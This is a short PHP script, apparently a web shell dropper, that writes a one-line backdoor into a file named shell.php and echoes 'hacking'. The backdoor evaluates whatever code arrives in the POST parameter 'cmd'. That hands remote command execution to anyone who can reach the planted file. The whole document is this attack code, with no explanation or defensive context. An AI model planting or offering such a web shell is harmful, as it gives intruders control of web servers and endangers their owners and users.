<?php
$a = '<?php @eval($_POST[\'cmd\']);?>';
file_put_contents('shell.php', $a);
echo "hacking";
?>